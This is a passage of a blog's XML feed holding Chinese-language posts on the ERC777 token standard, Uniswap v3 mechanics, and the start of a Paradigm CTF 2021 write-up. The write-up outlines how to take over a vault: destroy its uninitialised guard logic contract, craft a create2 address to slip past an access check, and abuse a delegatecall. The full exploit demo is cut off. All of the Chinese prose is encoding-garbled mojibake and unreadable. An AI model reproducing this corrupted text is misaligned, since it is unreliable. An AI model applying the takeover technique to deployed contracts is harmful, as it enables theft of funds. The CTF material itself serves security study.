·å¯ä»¥é˜²æ­¢ä»£å¸è¢«é”æ­»ï¼‰ï¼Œå¦‚æœæ²¡æœ‰å®ç°ï¼ŒERC777ä»£å¸åˆçº¦å¿…é¡»revert å›é€€äº¤æ˜“çŠ¶æ€<br>           require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ª transferFrom å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// æ³¨æ„ï¼Œ æ“ä½œå‘˜æ²¡æœ‰æƒé™è°ƒç”¨ï¼ˆé™¤éç»è¿‡approveï¼‰<br>// è§¦å‘ `Sent` and `Transfer`äº‹ä»¶<br><br> function transferFrom(address holder, address recipient, uint256 amount) external returns (bool) &#123;<br>     require(recipient != address(0), &quot;ERC777: transfer to the zero address&quot;);<br>     require(holder != address(0), &quot;ERC777: transfer from the zero address&quot;);<br><br>     address spender = msg.sender;<br><br>     _callTokensToSend(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>     _move(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;);<br>     _approve(holder, spender, _allowances[holder][spender].sub(amount));<br><br>     _callTokensReceived(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;, false);<br><br>     return true;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="é“¸å¸æ“ä½œ"><a href="#é“¸å¸æ“ä½œ" class="headerlink" title="é“¸å¸æ“ä½œ"></a>é“¸å¸æ“ä½œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// é“¸å¸å‡½æ•°ï¼ˆå³å¸¸è¯´çš„æŒ–çŸ¿ï¼‰<br>function _mint(<br>    address operator,<br>    address account,<br>    uint256 amount,<br>    bytes memory userData,<br>    bytes memory operatorData<br>)<br>internal<br>&#123;<br>    require(account != address(0), &quot;ERC777: mint to the zero address&quot;);<br><br>    // Update state variables<br>    // å‘è¡Œé‡éœ€è¦åŠ ä¸Šé“¸å¸é‡<br>    _totalSupply = _totalSupply.add(amount);<br>    // æ¥æ”¶è€…ä½™é¢åŠ ä¸Šé“¸å¸é‡<br>    _balances[account] = _balances[account].add(amount);<br><br>    _callTokensReceived(operator, address(0), account, amount, userData, operatorData, true);<br><br>    // è§¦å‘ Minted äº‹ä»¶<br>    emit Minted(operator, account, amount, userData, operatorData);<br>    emit Transfer(address(0), account, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»£å¸é”€æ¯"><a href="#ä»£å¸é”€æ¯" class="headerlink" title="ä»£å¸é”€æ¯"></a>ä»£å¸é”€æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// ä¸ºäº†å…¼å®¹ ERC20ï¼Œ è§¦å‘ `Transfer` äº‹ä»¶<br>function burn(uint256 amount, bytes calldata data) external &#123;<br>    _burn(msg.sender, msg.sender, amount, data, &quot;&quot;);<br>&#125;<br><br>// é”€æ¯<br>function operatorBurn(address account, uint256 amount, bytes calldata data, bytes calldata operatorData) external &#123;<br>    require(isOperatorFor(msg.sender, account), &quot;ERC777: caller is not an operator for holder&quot;);<br>    _burn(msg.sender, account, amount, data, operatorData);<br>&#125;<br><br>// é”€æ¯ä»£å¸å®ç°<br>function _burn(<br>    address operator,<br>    address from,<br>    uint256 amount,<br>    bytes memory data,<br>    bytes memory operatorData<br>)<br>    private<br>&#123;<br>    require(from != address(0), &quot;ERC777: burn from the zero address&quot;);<br><br>    _callTokensToSend(operator, from, address(0), amount, data, operatorData);<br><br>    // Update state variables<br>    // æ€»ä¾›åº”é‡å¿…é¡»å‡å°‘ä»£å¸é”€æ¯é‡<br>    _totalSupply = _totalSupply.sub(amount);<br>    // æŒæœ‰è€…çš„ä½™é¢å¿…é¡»å‡å°‘ä»£å¸é”€æ¯çš„æ•°é‡<br>    _balances[from] = _balances[from].sub(amount);<br><br>    // è§¦å‘ Burned äº‹ä»¶<br>    emit Burned(operator, from, amount, data, operatorData);<br>    emit Transfer(from, address(0), amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç›‘å¬ç¤ºä¾‹"><a href="#ç›‘å¬ç¤ºä¾‹" class="headerlink" title="ç›‘å¬ç¤ºä¾‹"></a>ç›‘å¬ç¤ºä¾‹</h2><p>é€šè¿‡<strong>å®ç° ERC777TokensRecipientæ¥å£</strong>æ¥ç›‘å¬ä»£å¸æ”¶æ¬¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC777/IERC777.sol&quot;;<br>import &quot;@openzeppelin/contracts/introspection/IERC1820Registry.sol&quot;;<br><br>contract Merit is IERC777Recipient &#123;<br><br>  mapping(address =&gt; uint) public givers;<br>  address _owner;<br>  IERC777 _token;<br><br>  IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);<br><br>  // keccak256(&quot;ERC777TokensRecipient&quot;)<br>  bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH =<br>      0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;<br><br>  constructor(IERC777 token) public &#123;<br>    _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));<br>    _owner = msg.sender;<br>    _token = token;<br>  &#125;<br><br>// æ”¶æ¬¾æ—¶è¢«å›è°ƒ<br>  function tokensReceived(<br>      address operator,<br>      address from,<br>      address to,<br>      uint amount,<br>      bytes calldata userData,<br>      bytes calldata operatorData<br>  ) external &#123;<br>    givers[from] += amount;<br>  &#125;<br><br>// æ–¹ä¸ˆå–å›åŠŸå¾·ç®±token<br>  function withdraw () external &#123;<br>    require(msg.sender == _owner, &quot;no permision&quot;);<br>    uint balance = _token.balanceOf(address(this));<br>    _token.send(_owner, balance, &quot;&quot;);<br>  &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è°ƒç”¨ ERC1820 æ³¨å†Œè¡¨åˆçº¦çš„ setInterfaceImplementerå‡½æ•° æ³¨å†ŒERC777TokensRecipientæ¥å£å®ç°ï¼ˆæ¥å£çš„å®ç°æ˜¯è‡ªèº«ï¼‰ï¼Œè¿™æ ·åœ¨æ”¶åˆ°ä»£å¸æ—¶ï¼Œä¼šå›è°ƒ tokensReceivedå‡½æ•°ï¼ŒtokensReceivedå‡½æ•°é€šè¿‡giversæ˜ å°„æ¥ä¿å­˜æ¯ä¸ªç”¨æˆ·çš„ä»£å¸é‡‘é¢ã€‚</p><h2 id="å®‰å…¨äº‹ä»¶"><a href="#å®‰å…¨äº‹ä»¶" class="headerlink" title="å®‰å…¨äº‹ä»¶"></a>å®‰å…¨äº‹ä»¶</h2><p><a href="https://paper.seebug.org/1182/">Uniswap çš„ ERC777 é‡å…¥é£é™©</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
      <tag>EIP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap v3 å­¦ä¹ ç¬”è®°</title>
    <link href="/2022/10/04/uniswap-v3-learning/"/>
    <url>/2022/10/04/uniswap-v3-learning/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><a href="https://uniswap.org/whitepaper-v3.pdf">Uniswap v3 ç™½çš®ä¹¦</a></p><h2 id="v2æ ¸å¿ƒå…¬å¼"><a href="#v2æ ¸å¿ƒå…¬å¼" class="headerlink" title="v2æ ¸å¿ƒå…¬å¼"></a>v2æ ¸å¿ƒå…¬å¼</h2><p><code>x*y=k</code>ï¼Œå³æ± å­ä¸­<code>èµ„äº§Xçš„æ•°é‡ * èµ„äº§Yçš„æ•°é‡ = æµåŠ¨æ€§æ•°é‡</code>ã€‚</p><p><img src="/2022/10/04/uniswap-v3-learning/understanding-01-pricechange.webp" alt="price changing"></p><p>ä½†æ˜¯èµ„é‡‘åˆ©ç”¨ç‡ä¸é«˜</p><p><img src="/2022/10/04/uniswap-v3-learning/understanding-02-liquidityrate.png" alt="liquidity rate"></p><p>å½“ç”¨æˆ·ç”¨ X æ¢å– Y çš„æ—¶å€™ï¼Œä»·æ ¼ä¼šä»ä½ç‚¹æ¶¨åˆ°é«˜ç‚¹ï¼Œçº¢ç‚¹ä» <code>p_lower</code> ç§»åŠ¨åˆ° <code>p_upper</code> çš„è¿‡ç¨‹ä¸­ï¼ˆX çš„ä»·æ ¼ï¼‰ï¼Œå®é™…å‚ä¸äº¤æ˜“çš„æµåŠ¨æ€§ä»…ä»…æ˜¯æ©™è‰²çš„çŸ©å½¢åŒºåŸŸã€‚</p><p>æ‰€ä»¥æé«˜åˆ©ç”¨ç‡çš„å…³é”®æ˜¯æ—¢è¦ç§»é™¤é‚£äº›èººåœ¨é‚£ä¸å¹²æ´»çš„æµåŠ¨æ€§ï¼ˆç»¿è‰²åŒºåŸŸï¼‰ï¼Œåˆè¦ä¿è¯è¿™ä¸ªå‡½æ•°æ¨¡å‹ä¸å˜ã€‚äºæ˜¯æˆ‘ä»¬å°†å…¶æ¢æˆäº†è™šæ‹Ÿçš„æµåŠ¨æ€§ï¼Œå³ <code>x_virtual</code> å’Œ <code>y_virtual</code>ï¼Œè€Œæ·»åŠ æµåŠ¨æ€§æ—¶ï¼Œåªéœ€è¦æ³¨å…¥æ©™è‰²åŒºåŸŸçš„æµåŠ¨æ€§å³å¯ã€‚äºæ˜¯å…¬å¼å˜æˆäº†å¦‚ä¸‹æ¨¡æ ·ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(x + x_virtual)</span>*<span class="hljs-comment">(y + y_virtual)</span>=k<br></code></pre></td></tr></table></figure><p><img src="/2022/10/04/uniswap-v3-learning/understanding-03-realliquidity.png" alt="real liquidity"></p><p>æ•´ä¸ªå›¾å½¢å‘å·¦ä¸‹æ–¹å¹³ç§»äº†ï¼Œå› ä¸ºä»·æ ¼æ˜¯ç›´çº¿çš„æ–œç‡ï¼Œæ‰€ä»¥å¹³ç§»å¯¹äºå®é™…äº¤æ˜“æ˜¯æ²¡æœ‰å½±å“çš„ã€‚<strong>å‰ææ˜¯ä»·æ ¼æ²¡æœ‰è¶…å‡ºé™å®šçš„åŒºé—´</strong>ã€‚</p><h2 id="v3æ ¸å¿ƒå…¬å¼"><a href="#v3æ ¸å¿ƒå…¬å¼" class="headerlink" title="v3æ ¸å¿ƒå…¬å¼"></a>v3æ ¸å¿ƒå…¬å¼</h2><p>å°†ä»£è¡¨æµåŠ¨æ€§çš„ <code>k</code> æ¢æˆ <code>ğ¿^2</code> å³ L çš„å¹³æ–¹</p><p>å¯ä»¥çœ‹å‡º <code>x_virtual</code> çš„é•¿åº¦å®é™…æ˜¯ <code>p_upper</code> ç‚¹çš„ xï¼Œè€Œ <code>y_virtual</code> çš„é•¿åº¦å®é™…ä¸Šæ˜¯ <code>p_lower</code> ç‚¹çš„ yã€‚</p><p>æœ‰ä»·æ ¼çš„å…¬å¼ <code>y = p*x</code> å’Œ <code>xy=L^2</code> </p><p>å¯ä»¥å¾—å‡º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">x = L / âˆšp<br>y = L * âˆšp<br><br><span class="hljs-regexp">//</span>ä¹Ÿå°±æ˜¯<br>x_virtual = L / âˆšp_upper<br>y_virtual = L * âˆšp_lower<br><br><span class="hljs-regexp">//</span>å³æ ¸å¿ƒå…¬å¼<br>(x + L / âˆšp_upper) * (y + L * âˆšp_lower) = L^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¬å¼ä¸­æ˜¯å°† <code>p_upper</code> å’Œ <code>p_lower</code> ä½œä¸ºå·²çŸ¥çš„å˜é‡ï¼Œæ‰€ä»¥åœ¨ V3 ä¸­æ·»åŠ æµåŠ¨æ€§ï¼Œæ˜¯éœ€è¦ç”¨æˆ·è‡ªå·±è®¾ç½®éœ€è¦åšå¸‚çš„ä»·æ ¼åŒºé—´çš„ã€‚V3 ä¸­åˆ›å»ºè€…ä¸åŒæˆ–è€…ä»·æ ¼åŒºé—´ä¸åŒï¼ˆæˆ–æ‰‹ç»­è´¹æ°´å¹³ä¸åŒï¼Œåé¢å±•å¼€è®¨è®ºï¼‰éƒ½æ˜¯ä¸åŒçš„æµåŠ¨æ€§å¤´å¯¸ <code>position</code>ã€‚</p><h2 id="AMM"><a href="#AMM" class="headerlink" title="AMM"></a>AMM</h2><p>AMMï¼Œå…¨ç§°Automated Market Makersï¼Œç¿»è¯‘è¿‡æ¥æ˜¯è‡ªåŠ¨åšå¸‚å•†ã€‚å…¶åŸºç¡€æ¨¡å‹æ¥æºäºVitalikäº2017å¹´å‘è¡¨çš„<a href="https://vitalik.ca/general/2017/06/22/marketmakers.html">åšå®¢</a>ï¼Œè®¨è®ºäº†â€œæ’å®šä¹˜æœºå…¬å¼â€ï¼Œå³æ¯ä¸€ä¸ªUniswap Pair ä¸­å­˜æœ‰ä¸¤ç§èµ„äº§ï¼Œå¹¶ä¸ºè¿™ä¸¤ç§èµ„äº§æä¾›æµåŠ¨æ€§ã€‚</p><p>swapä¸­çš„æ›²çº¿ç§»åŠ¨</p><p><img src="/2022/10/04/uniswap-v3-learning/rbuQJaMz60f3e528e4f29.png" alt="image20210717105238162.png"></p><p>mintä¸­çš„æ›²çº¿ç§»åŠ¨</p><p><img src="/2022/10/04/uniswap-v3-learning/image-20221004205749992.png" alt="image-20221004205749992"></p><p>burnæ˜¯mintçš„é€†å‘</p><h2 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h2><p>Uniswap v3 åœ¨ä»£ç å±‚é¢çš„æ¶æ„å’Œ v2 åŸºæœ¬ä¿æŒä¸€è‡´ï¼Œå°†åˆçº¦åˆ†æˆäº†ä¸¤ä¸ªä»“åº“ï¼š</p><ul><li><a href="https://github.com/Uniswap/v3-core">Uniswap-v3-core</a><ul><li>UniswapV3Factory æ˜¯äº¤æ˜“æ± (UniswapV3Pool)ç»Ÿä¸€åˆ›å»ºçš„æ¥å£ã€‚</li><li>UniswapV3Pool ç”± UniswapV3PoolDeployer ç»Ÿä¸€éƒ¨ç½²ã€‚ å®ç°ä»£å¸äº¤æ˜“ï¼ŒæµåŠ¨æ€§ç®¡ç†ï¼Œäº¤æ˜“æ‰‹ç»­è´¹çš„æ”¶å–ï¼Œoracle æ•°æ®ç®¡ç†ã€‚æ¥å£çš„å®ç°ç²’åº¦æ¯”è¾ƒä½ï¼Œä¸é€‚åˆæ™®é€šç”¨æˆ·ä½¿ç”¨ï¼Œé”™è¯¯çš„è°ƒç”¨å…¶ä¸­çš„æ¥å£å¯èƒ½ä¼šé€ æˆç»æµä¸Šçš„æŸå¤±ã€‚ UniswapV3Pool æ˜¯æ ¸å¿ƒé€»è¾‘ï¼Œç®¡ç†äº† Tick å’Œ Positionï¼Œå®ç°æµåŠ¨æ€§ç®¡ç†ä»¥åŠä¸€ä¸ªäº¤æ˜“æ± ä¸­ swap åŠŸèƒ½å®ç°ã€‚</li></ul></li><li><a href="https://github.com/Uniswap/v3-periphery">Uniswap-v3-periphery</a><ul><li>NonfungiblePositionManager è´Ÿè´£äº¤æ˜“æ± çš„åˆ›å»ºä»¥åŠæµåŠ¨æ€§çš„æ·»åŠ åˆ é™¤ï¼Œç”¨æ¥å¢åŠ /ç§»é™¤/ä¿®æ”¹ Pool çš„æµåŠ¨æ€§ï¼Œå¹¶ä¸”é€šè¿‡ NFT token å°†æµåŠ¨æ€§ä»£å¸åŒ–ã€‚ä½¿ç”¨ ERC721 tokenï¼ˆv2 ä½¿ç”¨çš„æ˜¯ ERC20ï¼‰çš„åŸå› æ˜¯åŒä¸€ä¸ªæ± çš„å¤šä¸ªæµåŠ¨æ€§å¹¶ä¸èƒ½ç­‰ä»·æ›¿æ¢ï¼ˆv3 çš„é›†ä¸­æµæ€§åŠ¨åŠŸèƒ½ï¼‰ã€‚</li><li>SwapRouter æ˜¯ swap è·¯ç”±çš„ç®¡ç†ã€‚æä¾›ä»£å¸äº¤æ˜“çš„æ¥å£ï¼Œå®ƒæ˜¯å¯¹ UniswapV3Pool åˆçº¦ä¸­äº¤æ˜“ç›¸å…³æ¥å£çš„è¿›ä¸€æ­¥å°è£…ï¼Œå‰ç«¯ç•Œé¢ä¸»è¦ä¸è¿™ä¸ªåˆçº¦æ¥è¿›è¡Œå¯¹æ¥ã€‚</li></ul></li></ul><p><a href="https://sissice.github.io/2022/08/20/uniswap-v3-1/">Uniswap Part â…  | åˆ›å»ºäº¤æ˜“å¯¹ - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/08/20/uniswap-v3-2/">Uniswap Part â…¡ | æä¾›/ç§»é™¤æµåŠ¨æ€§ - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-3/">Uniswap Part â…¢ | äº¤æ˜“è¿‡ç¨‹ - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-4/">Uniswap Part â…£ | äº¤æ˜“æ‰‹ç»­è´¹ - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-5/">Uniswap Part â…¤ | é¢„è¨€æœº - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-6/">Uniswap Part â…¥ | é—ªç”µè´· - Sissiceâ€™s Blog</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part three</title>
    <link href="/2022/10/03/ParadigmCTF2021three/"/>
    <url>/2022/10/03/ParadigmCTF2021three/</url>
    
    <content type="html"><![CDATA[<p><a href="https://sissice.github.io/2022/09/18/ParadigmCTF2021one/">Writeup | Paradigm CTF 2021 Part one - Sissiceâ€™s Blog</a></p><p><a href="https://sissice.github.io/2022/09/23/ParadigmCTF2021two/">Writeup | Paradigm CTF 2021 Part two - Sissiceâ€™s Blog</a></p><h2 id="VAULT"><a href="#VAULT" class="headerlink" title="VAULT"></a>VAULT</h2><p>è¿™é“é¢˜æ¶‰åŠåˆ°äº† <a href="https://learnblockchain.cn/article/721">EIP1167 ä»£ç†åˆçº¦</a> </p><p>é€šè¿‡æŒ‘æˆ˜çš„è¦æ±‚æ˜¯æ”¹å˜ä»£ç†åˆçº¦çš„ owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return vault.owner() != address(this);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹æ•´ä½“é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function Setup() public &#123;<br>// è®¾å®š SingleOwnerGuard ä¸º guard defaultImplementation<br>    registry = new GuardRegistry();<br>    registry.registerGuardImplementation(new SingleOwnerGuard(), true);<br><br>    // åˆ©ç”¨EIP-1167åˆ›å»ºä¸€ä¸ªä»£ç†åˆçº¦ vault<br>    // åŸåˆçº¦æ˜¯ SingleOwnerGuard<br>    vault = new Vault(registry);<br><br>    // æˆæƒ deposit å’Œ withdraw ä¸¤ä¸ªå‡½æ•°<br>    SingleOwnerGuard guard = SingleOwnerGuard(vault.guard());<br>    guard.addPublicOperation(&quot;deposit&quot;);<br>    guard.addPublicOperation(&quot;withdraw&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®çˆ†ç ´ç‚¹ï¼š</p><ul><li><p>æ„é€ å‡½æ•°ç›¸å…³çš„å­—èŠ‚ç åœ¨<code>init-code</code> ä¸­ï¼Œåªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚è€Œè‡ªå®šä¹‰çš„<code>initialize()</code>æ–¹æ³•å­˜åœ¨äº<code>runtime code</code>ä¸­ï¼Œå¯è¢«åå¤è°ƒç”¨ï¼Œéœ€è¦è‡ªå·±å†™é€»è¾‘ä¿è¯åªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// æ„é€ å‡½æ•°<br>function Vault(GuardRegistry registry_) public &#123;<br>    owner = msg.sender;<br>    registry = registry_;<br>  <br>    createGuard(registry.defaultImplementation());<br>&#125;<br>  <br>// create new guard instance<br>// åˆ©ç”¨EIP-1167åˆ›å»ºä¸€ä¸ªä»£ç†åˆçº¦<br>// ä¼ å…¥çš„æ˜¯é€»è¾‘åˆçº¦<br>function createGuard(bytes32 implementation) private returns (Guard) &#123;<br>    address impl = registry.implementations(implementation);<br>    require(impl != address(0x00));<br>  <br>    if (address(guard) != address(0x00)) &#123;<br>        guard.cleanup();<br>    &#125;<br>  <br>    // åˆ›å»ºä»£ç†åˆçº¦<br>    guard = Guard(createClone(impl));<br>    // ä»£ç†åˆçº¦çš„åˆå§‹åŒ–<br>    guard.initialize(this);<br>    return guard;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ Vault ä¸­åªåˆå§‹åŒ–äº†ä»£ç†åˆçº¦ï¼Œè€ŒçœŸæ­£çš„é€»è¾‘åˆçº¦ SingleOwnerGuard å¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œç±»ä¼¼äºè‘—åäº‹ä»¶ <a href="https://github.com/openethereum/parity-ethereum/issues/6995">anyone can kill your contract</a></p></li><li><p>è°ƒç”¨ä¸€ä¸ªè¢«é”€æ¯çš„åˆçº¦ï¼Œå®ƒåªæ˜¯ä¼šæ‰§è¡ŒSTOPè¿™ä¸€ä¸ªOPCODEï¼Œä¸ä¼šREVERTï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè°ƒç”¨æˆåŠŸ</p></li><li><p>åœ¨solidity&lt;0.5.0çš„ç‰ˆæœ¬ä¸­ï¼Œè¿”å›å€¼å­˜æ”¾çš„ä½ç½®æŒ‡é’ˆä¸å‚æ•°å€¼çš„å†…å­˜æŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜åœ°å€ã€‚è¿”å›å€¼æ‹·è´åˆ°å†…å­˜ä¸­æ—¶ï¼Œå¦‚æœè¿”å›å€¼çš„å®é™…é•¿åº¦ä¸º0ï¼Œåˆ™å…¶å®é™…ä¸Šæ‹·è´åˆ°å†…å­˜ä¸­çš„æ•°å€¼é•¿åº¦ä¹Ÿä¸º0ã€‚CALLä¸ä¼šå»è¦†ç›–å†…å­˜çš„å€¼ã€‚</p><p>è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬é”€æ¯äº†é€»è¾‘åˆçº¦ SingleOwnerGuard ï¼Œé‚£ä¹ˆä¼šå¾—åˆ°å†…å­˜ä¸­å·²ç»å­˜åœ¨çš„å†…å®¹ï¼Œå³è¾“å…¥</p><p>å› æ­¤å½“ SingleOwnerGuard è¢«é”€æ¯ä»¥åï¼Œæˆ‘ä»¬ä¼ å…¥çš„åœ°å€çš„ç¬¬16ä½æ•°å€¼å°±æ˜¯ error çš„å†…å­˜ä½ç½®</p><p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ create æˆ–è€… create2 æ¥ç”Ÿæˆç‰¹å®šçš„åˆçº¦åœ°å€ï¼Œä½¿åˆçº¦åœ°å€ç¬¬16ä½ä¸º NO_ERRORï¼Œç»•å¼€æƒé™æ£€æŸ¥</p></li><li><p>emergencyCall å‡½æ•°å¯ä»¥è‡ªè¡Œä¼ å…¥dataï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ç»•å¼€äº†æƒé™æ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥åšä»»ä½•äº‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function emergencyCall(address target, bytes memory data) public &#123;<br>    require(checkAccess(&quot;emergencyCall&quot;));<br><br>    require(target.delegatecall(data));<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>å®Œæ•´çš„demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 